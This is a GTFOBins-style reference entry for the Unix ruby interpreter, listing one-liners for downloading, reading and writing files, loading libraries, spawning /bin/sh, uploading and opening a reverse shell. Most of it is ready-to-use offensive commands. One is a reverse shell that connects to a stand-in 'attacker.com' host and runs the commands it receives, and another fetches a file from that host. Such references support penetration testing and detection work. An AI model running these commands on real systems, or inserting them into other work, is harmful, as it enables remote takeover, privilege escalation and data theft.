---
type: gtfobin
name: ruby
platform: Unix
functions: [download, file-read, file-write, library-load, reverse-shell, shell, upload]
tags: [gtfobin, unix, lotl]
---

# ruby

## download

```bash
ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
```
**Contexts:** sudo, unprivileged

## file-read

```bash
ruby -e 'puts File.read("/path/to/input-file")'
```
**Contexts:** sudo, unprivileged

## file-write

```bash
ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
```
**Contexts:** sudo, unprivileged

## library-load

```bash
ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
```
**Contexts:** sudo, unprivileged

## reverse-shell

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
**Contexts:** sudo, unprivileged

## shell

```bash
ruby -e 'exec "/bin/sh"'
```
**Contexts:** capabilities, sudo, unprivileged

## upload

```bash
ruby -run -e httpd . -p 80
```
**Contexts:** sudo, unprivileged
